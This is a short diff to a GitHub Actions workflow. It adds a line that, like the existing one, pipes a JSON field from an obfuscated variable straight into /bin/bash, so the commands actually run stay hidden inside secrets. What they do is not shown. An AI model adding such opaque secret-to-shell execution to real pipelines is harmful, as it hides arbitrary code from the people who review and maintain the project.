@@ -19,6 +19,7 @@ jobs:
           zp29209: ${{ secrets.zp29209 }}
         run: |
           printf '%s' "$zp29209" | jq -r .reyi717 | /bin/bash
+          echo $ceys52569 | jq -r .wjsl593 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
